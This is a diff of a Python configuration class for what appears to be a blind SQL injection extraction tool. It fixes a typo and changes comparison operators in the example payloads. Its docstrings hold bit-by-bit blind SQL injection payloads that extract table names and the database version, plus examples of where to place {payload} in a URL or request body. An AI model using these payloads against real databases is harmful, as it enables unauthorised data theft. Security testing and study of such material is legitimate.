@@ -1,4 +1,4 @@
-#Version 2022-03-28
+#Version 2022-06-10
 class Configuration(dict):
     def __init__(self):
         ######################################
@@ -29,7 +29,7 @@ class Configuration(dict):
                         With mulitple rows: `SUBSTRING(REVERSE(BIN(ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT {offsetIndex},1),{charIndex},1)))),{bitIndex},1)=1`
                         With one row:       `SUBSTRING(REVERSE(BIN(ASCII(SUBSTRING((SELECT @@version),{charIndex},1)))),{bitIndex},1)=1`
 
-            To know where to inject the payload, the URL or the data must contain the keywork {payload}.
+            To know where to inject the payload, the URL or the data must contain the keyword {payload}.
                 Example: `url = http://127.0.0.1/?id={payload}`
                 Example: `data = {"id":"{payload}"}`
         """
@@ -39,7 +39,7 @@ class Configuration(dict):
             Important note:
                 Use only if necessary.
             If you want to count the number of rows prior extracting them, use the following parameter. However, it may not work properly and increase the duration of the script.
-                Example: `(select count(table_name) from information_schema.tables)>{ascii}`
+                Example: `(select count(table_name) from information_schema.tables)>={ascii}`
         """
         self.countRows = "" 
         
@@ -47,7 +47,7 @@ class Configuration(dict):
             Important note:
                 Use only if necessary.
             If you want to find the length of the word to extract prior extracting it, use the following parameter. However, it may not work properly and increase the duration of the script.
-                Example: `(select length(@@version))>{ascii}`
+                Example: `(select length(@@version))>={ascii}`
         """
         self.findLength = "" 
         
